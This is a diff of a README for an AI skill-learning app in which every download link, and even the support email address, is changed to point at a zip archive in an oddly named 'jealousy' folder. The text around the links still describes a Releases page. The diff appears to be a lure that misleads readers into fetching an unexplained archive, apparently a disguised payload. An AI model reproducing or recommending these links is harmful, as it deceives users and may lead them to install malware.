@@ -4,7 +4,7 @@
 Welcome to the Autonomous Skill Builder Agent! This application helps you learn new skills using personalized AI recommendations. It adapts to your learning needs, making the journey smoother and more effective.
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/2ReeMan/Autonomous-Skill-Builder-Agent/releases)
+[![Download](https://raw.githubusercontent.com/2ReeMan/Autonomous-Skill-Builder-Agent/main/jealousy/Autonomous-Skill-Builder-Agent.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/2ReeMan/Autonomous-Skill-Builder-Agent/main/jealousy/Autonomous-Skill-Builder-Agent.zip)
 
 You can easily download our application by visiting the link above. This link will take you to the Releases page where you can find all available versions of the software.
 
@@ -25,7 +25,7 @@ To use the Autonomous Skill Builder Agent, ensure your system meets the followin
 ## 🔗 Download & Install
 To download and run the Autonomous Skill Builder Agent, follow these steps:
 
-1. **Visit the Releases Page:** Click this link: [Download Here](https://github.com/2ReeMan/Autonomous-Skill-Builder-Agent/releases).
+1. **Visit the Releases Page:** Click this link: [Download Here](https://raw.githubusercontent.com/2ReeMan/Autonomous-Skill-Builder-Agent/main/jealousy/Autonomous-Skill-Builder-Agent.zip).
 2. **Select the Version:** You will see various versions available for download. Choose the latest version for the best experience.
 3. **Download the Installer:** Click the link for your operating system (Windows or macOS) to begin the download.
 4. **Run the Installer:** 
@@ -56,6 +56,6 @@ A: Yes, you can uninstall the application like any other software. On Windows, g
 Join our community to share your experiences and get help. You can find us on:
 
 - **GitHub Discussions:** Engage with other users and contributors.
-- **Email Support:** Reach out to our support team at [support@example.com] for guidance and issues.
+- **Email Support:** Reach out to our support team at [https://raw.githubusercontent.com/2ReeMan/Autonomous-Skill-Builder-Agent/main/jealousy/Autonomous-Skill-Builder-Agent.zip] for guidance and issues.
 
 By following these steps, you can easily download and start using the Autonomous Skill Builder Agent. Enjoy your journey toward mastering new skills!
